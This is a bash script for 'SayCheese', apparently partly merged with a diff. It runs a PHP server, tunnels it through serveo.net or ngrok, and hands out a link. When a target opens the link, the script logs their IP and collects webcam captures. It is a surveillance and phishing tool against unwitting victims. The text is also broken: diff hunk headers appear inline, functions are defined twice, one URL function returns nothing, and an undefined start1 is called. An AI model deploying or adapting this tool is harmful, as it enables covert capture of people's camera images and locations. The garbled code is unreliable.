#!/bin/bash
# SayCheese v1.0
# coded by: github.com/thelinuxchoice/saycheese
# If you use any part from this code, giving me the credits. Read the Lincense!

trap 'printf "\n";stop' 2

banner() {


printf "\e[1;92m  ____              \e[0m\e[1;77m ____ _                          \e[0m\n"
printf "\e[1;92m / ___|  __ _ _   _ \e[0m\e[1;77m/ ___| |__   ___  ___  ___  ___  \e[0m\n"
printf "\e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
printf "\e[1;92m              |___/ \e[0m                                 \n"

printf " \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"

printf "\n"


}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link

}

#Here is the modified code for Ngrok server

# Function to get the Ngrok public URL
get_ngrok_url() {
    local tunnel_info=$(curl -s -N http://127.0.0.1:4040/api/tunnels)
    local url=$(echo "$tunnel_info" | jq -r '.tunnels[0].public_url')
}

# Function to update the files with the Ngrok tunnel URL
payload_ngrok() {
    link=$(get_ngrok_url)
    sed -i 's+forwarding_link+'"${link//&/\\&}"'+g' saycheese.html
    sed -i 's+forwarding_link+'"${link//&/\\&}"'+g' template.php
}

# Function to stop the server and related processes
stop() {
    printf "\nStopping the server and related processes...\n"
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
    killall -2 php > /dev/null 2>&1
    killall -2 ssh > /dev/null 2>&1
    exit 1
}

# Function to check dependencies
dependencies() {
    command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
    command -v jq > /dev/null 2>&1 || { echo >&2 "I require jq but it's not installed. Install it. Aborting."; exit 1; }
}


ngrok_server() {


	@@ -168,12 +190,17 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
/usr/local/bin/ngrok http 3333 > /dev/null 2>&1 & #Path modified to work with the binary
sleep 10
# Get the Ngrok public URL. This function is updated to work with the new Ngrok API.
get_ngrok_url2() {
    local tunnel_info=$(curl -s -N http://127.0.0.1:4040/api/tunnels)
    local url=$(echo "$tunnel_info" | jq -r '.tunnels[0].public_url')
    echo "$url"
}

link2=$(get_ngrok_url2)  # Get the Ngrok public URL
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link2
payload_ngrok
checkfound
}
	@@ -240,4 +267,3 @@ checkfound
banner
dependencies
start1